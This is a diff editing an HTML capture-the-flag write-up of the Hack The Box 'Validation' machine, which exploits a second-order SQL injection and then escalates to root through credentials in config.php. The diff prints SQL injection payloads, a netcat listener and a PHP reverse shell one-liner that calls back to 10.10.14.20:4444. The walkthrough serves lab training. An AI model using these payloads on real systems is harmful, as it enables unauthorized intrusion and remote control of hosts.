@@ -184,11 +184,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
 </pre>
                                 </div>
                             </div>
+                            <p>It's a hit,</p> 
+                            <p>The error message indicates a second order SQL injection.</p>
                             <img src="/htb/Validation/5.png" alt="tried for SQL injection in country input">
-                            <p>It's a hit, it seems to be a second order SQL injection </p>
-                            <p>The input is being stored and when used its not being parsed properly.</p>
+                            <p>The input is being stored and when used, is not being parsed properly.</p>
                             <p>But the injected query failed for some reason.</p>
-                            <p>Trying the same query again with a different username and country made it work.</p>
                             <!-- Code Snippet -->
                             <div class="card s-rounded code-card">
                                 <div class="card-body">
@@ -196,6 +196,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
 </pre>
                                 </div>
                             </div>
+                            <p>Trying the same query again with a different username and country made it work.</p>
                             <img src="/htb/Validation/6.png" alt="Second try with different username and country">
                             <p>Let's try some UNION based SQL queries.</p>
                             <p>First let's determine the number of columns</p>
@@ -221,9 +222,9 @@ username=utkc2&country=Algeria' UNION SELECT user() #
     uhc@localhost</pre>
                                 </div>
                             </div>
-                            <p>I dug in a bit further enumerating the database but didn't find anything intresting.</p>
+                            <p>I enumerated the database bit further, but didn't find anything intresting.</p>
                             <h2 id="user">Gaining an Initial Foothold</h2>
-                            <p>Lets try uploading file to the server with SQL injection.</p>
+                            <p>Lets try uploading a file to the server.</p>
                             <!-- Code Snippet -->
                             <div class="card s-rounded code-card">
                                 <div class="card-body">
@@ -248,31 +249,33 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <p>Let's get a reverse shell now.</p>
                             <img src="/htb/Validation/11.png" alt="not netcat">
                             <p>The machine dosen't have netcat.</p>
-                            <p>We can got to <a
+                            <p>We can go to <a
                                     href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a>
-                                and try some reverse shells.</p>
-                            <p>Since it's a php website we can try a php reverse shell.</p>
-                            <p>Let's also set up a netcat listner on our machine</p>
+                                to try some reverse shells.</p>
+                            <p>Let's set up a netcat listner first:</p>
                             <!-- Code Snippet -->
                             <div class="card s-rounded code-card">
                                 <div class="card-body">
                                     <!-- change the special chars -->
-                                    <pre class="code-p">nc -lnvp 4444
-
-?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
+                                    <pre class="code-p">nc -lnvp 4444</pre>
                                 </div>
                             </div>
-                            <!-- <blockquote>
-                                <p>Don't forget to URL encode the reverse shell code when entering it into the browser.</p>
-                            </blockquote> -->
+                            <p>Reverse shell Payload:</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <!-- change the special chars -->
+                                    <pre class="code-p">?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
+                                </div>
+                            </div>
+                            
                             <img src="/htb/Validation/12.png" alt="reverse shell cought on netcat">
                             <p>And we got ourselves a revershe shell.</p>
                             <p>Let's get the user flag</p>
                             <img src="/htb/Validation/13.png" alt="user flag">
                             <h2 id="root">Privilege Escalation</h2>
                             <p>Getting the root flag on this machine was pretty easy.</p>
-                            <p>There isn't much need for enumeration here</p>
-                            <p>credentials file was right where we landed when we got the shell!</p>
+                            <p>Credentials file was right where we landed when we got the shell!</p>
                             <p>Let's got to the <code>html</code> directory and look into <code>config.php</code> file.
                             </p>
                             <img src="/htb/Validation/14.png" alt="config file exploration">
@@ -289,11 +292,11 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <p>Here are some takeaways from this Writeup:</p>
                             <ul>
                                 <li>
-                                    <p>Second order SQL injections are just properly stored SQL queries which are used
-                                        later on in the application in an unsafe manner.</p>
+                                    <p>Second order SQL injections are stored SQL queries which are used improperly in
+                                        the application.</p>
                                 </li>
                                 <li>
-                                    <p>Always hunt for clear text passwords.</p> 
+                                    <p>Always hunt for clear text passwords.</p>
                                     <p>If you find a password in a CTF, it is meant to be there for a reason.</p>
                                 </li>
                             </ul>
